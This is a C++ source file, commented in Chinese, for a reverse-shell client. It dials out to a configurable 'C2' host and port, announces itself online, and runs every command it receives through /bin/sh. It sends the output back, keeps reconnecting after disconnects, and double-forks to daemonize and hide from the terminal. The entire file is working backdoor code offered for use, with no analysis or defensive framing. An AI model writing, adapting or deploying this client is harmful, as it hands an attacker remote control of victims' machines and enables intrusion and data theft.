/* =============================================================
 *  client.cpp - C++ 反弹 shell 客户端
 *  与 server_py/server.py 协议兼容:
 *    1) 反向连接 HOST:PORT
 *    2) 上线后发送 banner "[+] client online\n"
 *    3) 一次 recv 收一段命令,strip 后用 /bin/sh -c 执行
 *    4) 把 stdout+stderr 合并回传
 *    5) 收到 "exit"/"quit" 退出;否则循环等下一条
 *    6) 任意时刻断线 -> sleep(RETRY_DELAY) 后重连
 *
 *  socket 部分封装在 simple_socket 类里,接口风格贴近 Python,
 *  本文件里看到的代码几乎就是 client.py 的 C++ "翻译版"。
 *
 *  编译: make   (Makefile 会自动把 simple_socket.cpp 链进来)
 * ============================================================= */
#include "simple_socket.h"

#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <unistd.h>

#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <exception>
#include <string>

/* ---------- 配置(默认与 client_py/client.py 一致)----------
 * HOST / PORT 都用 #ifndef 包围,允许编译时 -DHOST='"..."' -DPORT=xxxx 覆盖。
 */
#ifndef HOST
#define HOST          "127.0.0.1"   /* C2 地址 */
#endif
#ifndef PORT
#define PORT          4444          /* C2 端口 */
#endif
#define BUFSIZE       4096          /* 与 server 端 recv 缓冲一致 */
#define RECV_TIMEOUT  30            /* 收发 socket 超时(秒) */
#define CMD_TIMEOUT   60            /* 单条命令执行超时(秒) */
#define RETRY_DELAY   5             /* 断线后重连间隔(秒) */

/* ---------- trim:去掉首尾的 \r \n 空格 tab ---------- */
static std::string trim(const std::string &s) {
    size_t b = 0, e = s.size();
    while (b < e &&
           (s[b] == ' ' || s[b] == '\t' || s[b] == '\r' || s[b] == '\n'))
        ++b;
    while (e > b &&
           (s[e - 1] == ' ' || s[e - 1] == '\t' ||
            s[e - 1] == '\r' || s[e - 1] == '\n'))
        --e;
    return s.substr(b, e - b);
}

/* ---------- 用 /bin/sh -c 执行命令,合并 stdout+stderr,带超时 ---------- */
static std::string run_cmd(const std::string &cmd) {
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        return std::string("[!] pipe failed: ") + strerror(errno) + "\n";
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        return std::string("[!] fork failed: ") + strerror(errno) + "\n";
    }

    if (pid == 0) {
        /* child: 把 stdout/stderr 重定向到 pipe 写端 */
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", cmd.c_str(), (char *)NULL);
        _exit(127);  /* exec 走不到这里,127 表示 "command not found" */
    }

    /* parent: 从 pipe 读,select 1s 轮询检查整体超时 */
    close(pipefd[1]);

    std::string out;
    char buf[BUFSIZE];
    time_t start = time(nullptr);
    bool timed_out = false;

    for (;;) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(pipefd[0], &rfds);
        struct timeval tv = {1, 0};
        int rv = select(pipefd[0] + 1, &rfds, nullptr, nullptr, &tv);

        if (rv > 0) {
            ssize_t n = read(pipefd[0], buf, sizeof(buf));
            if (n > 0) {
                out.append(buf, (size_t)n);
                start = time(nullptr);   /* 还有输出,延长超时窗口 */
            } else {
                break;                    /* EOF / error,跳出等收尸 */
            }
        } else if (rv == 0) {
            /* select 超时(1s),检查整体命令是否超时 */
            if (time(nullptr) - start >= CMD_TIMEOUT) {
                kill(pid, SIGKILL);       /* 不等它配合,直接 KILL */
                timed_out = true;
                break;
            }
        } else {
            if (errno != EINTR) break;
        }
    }

    close(pipefd[0]);
    int status = 0;
    waitpid(pid, &status, 0);              /* 收尸,避免僵尸 */

    if (timed_out) out.append("[!] command timeout\n");
    return out;
}

/* ---------- 屏蔽 SIGPIPE:对端关掉时 send 不至于把进程干掉 ---------- */
static void ignore_signals(void) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
}

/* ---------- double-fork daemonize,脱离终端 ---------- */
static void daemonize(void) {
    /* 调试用:设 CLIENT_FOREGROUND=1 跳过 daemonize,前台运行方便观察 */
    if (getenv("CLIENT_FOREGROUND") != NULL) return;

    pid_t pid = fork();
    if (pid < 0) _exit(1);
    if (pid > 0) _exit(0);                 /* 第一次 fork:父进程退出 */

    if (setsid() < 0) _exit(1);            /* 新建会话,脱离 tty */

    pid = fork();
    if (pid < 0) _exit(1);
    if (pid > 0) _exit(0);                 /* 第二次 fork:确保无法重获 tty */

    umask(0);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        if (devnull != STDIN_FILENO)  dup2(devnull, STDIN_FILENO);
        if (devnull != STDOUT_FILENO) dup2(devnull, STDOUT_FILENO);
        if (devnull != STDERR_FILENO) dup2(devnull, STDERR_FILENO);
        if (devnull > STDERR_FILENO) close(devnull);
    }

    ignore_signals();
}

/* ---------- 主循环 ----------
 * 与 client.py 几乎一一对应:
 *   while True:
 *       sock = socket.socket(...)
 *       sock.settimeout(30)
 *       sock.connect(...)
 *       sock.sendall(b"[+] client online\n")
 *       while True:
 *           data = sock.recv(4096)        -> 失败抛异常 / 对端关返回 ""
 *           cmd = data.decode().strip()
 *           if not cmd: continue
 *           if cmd in ("exit","quit"): sock.close(); return
 *           sock.sendall(run_cmd(cmd).encode())
 *   except Exception: time.sleep(5)
 */
int main(void) {
    daemonize();

    while (true) {
        bool bye = false;
        try {
            SimpleSocket sock;
            sock.settimeout(RECV_TIMEOUT);
            sock.connect(HOST, PORT);
            sock.sendall(std::string("[+] client online\n"));

            while (true) {
                std::string data;
                try {
                    data = sock.recv(BUFSIZE);
                } catch (const std::exception &) {
                    /* 超时或 recv 错误 —— 退出内层,走外层重连 */
                    break;
                }
                if (data.empty()) break;       /* 对端关闭 */

                std::string cmd = trim(data);
                if (cmd.empty()) continue;

                if (cmd == "exit" || cmd == "quit") {
                    bye = true;
                    break;
                }

                std::string result = run_cmd(cmd);
                if (result.empty()) continue;  /* 空结果不浪费一次 send */

                try {
                    sock.sendall(result);
                } catch (const std::exception &) {
                    break;                      /* send 失败,断开重连 */
                }
            }
        } catch (const std::exception &) {
            /* socket() / connect() / setsockopt() 等出错都走这里 */
        }

        if (bye) return 0;
        sleep(RETRY_DELAY);
    }
}